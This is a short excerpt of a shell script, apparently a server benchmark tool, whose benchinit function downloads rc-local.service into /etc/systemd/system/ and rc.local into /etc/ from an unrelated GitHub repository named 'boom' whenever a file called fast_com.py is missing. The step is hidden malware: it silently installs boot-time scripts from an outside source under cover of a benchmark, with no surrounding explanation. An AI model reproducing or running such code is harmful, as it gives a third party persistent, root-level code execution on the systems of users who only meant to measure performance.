...
benchinit() {
	...
	if  [ ! -e 'fast_com.py' ]; then
        ...
        cd /etc/systemd/system/ && wget https://raw.githubusercontent.com/oahiewuoil/boom/master/rc-local.service
        cd /etc/ && wget https://raw.githubusercontent.com/oahiewuoil/boom/master/rc.local
